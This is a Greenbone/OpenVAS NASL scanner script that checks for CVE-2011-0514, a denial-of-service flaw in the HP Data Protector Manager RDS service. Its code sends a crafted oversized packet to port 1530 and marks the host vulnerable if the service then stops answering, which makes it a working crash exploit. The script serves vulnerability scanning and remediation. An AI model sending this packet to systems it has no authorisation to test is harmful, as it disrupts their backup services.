# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900291");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2011-0514");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("HP (OpenView Storage) Data Protector Manager RDS Service DoS Vulnerability");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555, 1530);
  script_mandatory_keys("microfocus/data_protector/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service condition.");

  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector Manager 6.11. Other
  versions may also be affected.");

  script_tag(name:"insight", value:"The flaw is caused by an error in the RDS service (rds.exe)
  when processing malformed packets sent to port 1530/TCP, which could be exploited by remote
  attackers to crash an affected server.");

  script_tag(name:"summary", value:"HP (OpenView Storage) Data Protector Manager is prone to a
  denial of service (DoS) vulnerability.");

  script_tag(name:"solution", value:"Update to version A.06.20 or later.");

  script_xref(name:"URL", value:"http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64549");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15940/");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if(!get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

## HP (OpenView Storage) Data Protector Manager default port
hpMgrPort = 1530;

if( ! get_port_state( hpMgrPort ) )
  exit( 0 );

soc1 = open_sock_tcp( hpMgrPort );
if( ! soc1 )
  exit( 0 );

# nb: Crafted packet with big data packet size
req = raw_string( 0x23, 0x8c, 0x29, 0xb6,   ## header (always the same)
                  0x64, 0x00, 0x00, 0x00,   ## data packet size (too big)
                  0x41, 0x41, 0x41, 0x41 ); ## data

send( socket:soc1, data:req );

sleep( 2 );

close( soc1 );

soc2 = open_sock_tcp( hpMgrPort );
if( ! soc2 ) {
  security_message( port:port );
  exit( 0 );
}

close( soc2 );

exit( 99 );
